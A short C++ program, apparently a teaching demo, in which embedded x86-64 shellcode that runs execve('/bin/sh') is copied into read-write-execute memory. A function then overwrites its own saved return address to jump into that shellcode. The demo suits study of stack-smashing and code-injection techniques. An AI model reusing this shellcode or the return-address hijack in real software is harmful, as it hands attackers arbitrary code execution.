#include <iostream>
#include <iomanip>
#include <cstring>
#include <sys/mman.h>


static char run_shell[] =
	"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x48\x8d\x3d\xe1\xff\xff\xff\x48\x8d\x35\xe2\xff"
	"\xff\xff\x48\x89\x3e\x48\xc7\xc2\x00\x00\x00\x00"
	"\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x48\x89\xc7"
	"\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05";
static char *run_shell_exec;

char *allocate_executable_memory(unsigned size)
{
	return (char *)mmap(0, size,
		PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void foo()
{
	unsigned long top = 0;
	unsigned long *ret = &top + 3;
	*ret = (unsigned long)(run_shell_exec + 24);
}

int main()
{
	int x;

	run_shell_exec = allocate_executable_memory(sizeof(run_shell));
	memcpy(run_shell_exec, run_shell, sizeof(run_shell));

	x = 1;
	foo();
	x = 2;
	std::cout << "x = " << x << "\n";

	return 0;
}
